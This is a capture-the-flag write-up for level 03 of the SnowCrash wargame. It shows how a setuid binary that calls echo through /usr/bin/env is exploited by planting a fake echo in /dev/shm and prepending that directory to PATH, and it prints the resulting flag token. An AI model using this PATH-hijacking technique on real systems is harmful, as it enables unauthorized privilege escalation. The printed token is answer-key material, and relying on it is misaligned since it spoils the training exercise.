# Level 03

## Vulnerability
Privilege escalation, exploit SUID program by using environment variables

## Context
In our home directory, we find a binary ```level03```

## Solution
```
level03@SnowCrash:~$ ls -l
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```
Here we see that when we run this binary, we run it with flag03 permissions (as indicated by the 's' for setuid after  '-rw').
We don't have the permissions to run ```getflag``` directly, but maybe we can use the `./level03` binary to run ```getflag``` for us. 
Let's run the file. 
```
level03@SnowCrash:~$ ./level03
Exploit me
```
We're on the right track. Let's investigate further.
```
level03@SnowCrash:~$ strings level03 | grep "Exploit"
/usr/bin/env echo Exploit me
```
It looks like ./level03 is calling ```echo``` from ```usr/bin/env```. It's calling binary that's defined by the environment.
So maybe the trick is to substitute our own ```echo``` binary, which calls ```getflag``` with ```flag03``` user permissions.

Let's confirm where the getflag is. 
```
level03@SnowCrash:~$ ls -l /bin | grep "getflag"
-rwxr-xr-x 1 root root   11833 Aug 30  2015 getflag
level03@SnowCrash:~$ cd bin; ./getflag
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)
```
As we suspected. Time for some redirection. 
```
level03@SnowCrash:~$ echo "/bin/getflag" > /dev/shm/echo
level03@SnowCrash:~$ chmod +x /dev/shm/echo
level03@SnowCrash:~$ PATH=/dev/shm:$PATH
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
